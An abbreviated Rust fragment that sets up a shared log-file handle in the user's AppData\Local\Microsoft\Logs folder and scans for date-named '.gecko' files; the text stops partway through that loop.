use std::{fs::{self, OpenOptions, File}, io, path::{Path,PathBuf}, sync::{Arc, Mutex}};
...
pub fn filehandler() -> io::Result<Arc<Mutex<File>>> {
    ...
    let user_profile = match std::env::var("USERPROFILE") {
        ...
        Err(_) => {
            ...
            return Err(io::Error::new(io::ErrorKind::Other, "Unable to determine current user's profile."));
        }
    };

    // Define the directory path
    let logs_dir = Path::new(&user_profile).join("AppData").join("Local").join("Microsoft").join("Logs");
    ...
    // Command::new("explorer.exe").arg(&logs_dir).status().unwrap();
    ...
    for file in &existing_files {
        if let Some(file_name) = file.file_name() {
            if let Some(file_name_str) = file_name.to_str() {
                if file_name_str.starts_with(&format!("{}", current_date)) && file_name_str.ends_with(".gecko") {
